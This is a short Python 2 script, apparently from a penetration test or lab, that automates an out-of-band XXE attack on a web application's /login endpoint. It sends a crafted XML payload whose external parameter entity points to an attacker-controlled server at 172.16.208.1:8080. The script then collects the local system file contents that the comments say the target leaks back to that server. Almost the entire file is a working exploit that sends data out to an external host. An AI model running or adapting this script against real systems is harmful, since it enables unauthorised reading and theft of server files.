#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

def getInfo():
	# Determine number of payloads on our server
	resp = requests.get("http://172.16.208.1:8080/getInfo")
	numPayloads = resp.content
	for i in range(0,int(numPayloads)):
		# Issue requests to generate requests to our controlled server
		submitRequest()

	# Obtain details from our server application
	getFinalDetails()

def submitRequest():
	# Used to instantiate the attack
	# Induces an HTTP request from the application's webserver to our controlled server
	# Our server then 'serves' XML Entities. When these external entities are processed by the web application
	# The local system files contents are queried and included within a subsequent request.
	# This request template can be generated by using the "Copy as requests" Burp Extension

	requests.post("http://172.16.208.137:80/login", headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
		"Referer": "http://172.16.208.137/login", "Cookie": "PLAY_FLASH=test", "Connection": "close", "Upgrade-Insecure-Requests": "1",
		"Content-Type": "text/xml", "Content-Length": "199"},
		data="<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % xxeEntity SYSTEM \"http://172.16.208.1:8080/ev.xml\">\r\n%xxeEntity;\r\n%content;\r\n]>\r\n<xxeElement>&xxeEntity;</xxeElement>")

def getFinalDetails():
	# Obtains final attack details from our server
	resp = requests.get("http://172.16.208.1:8080/getFinalDetails")
	results = resp.content

	# Does some cleaning up for odd characters
	x = results.replace("%0A","\n")
	x = x.replace("/?","")
	print x
	reset()

def reset():
	# Instructs server to reset data
	requests.get("http://172.16.208.1:8080/reset")

getInfo()

##
##
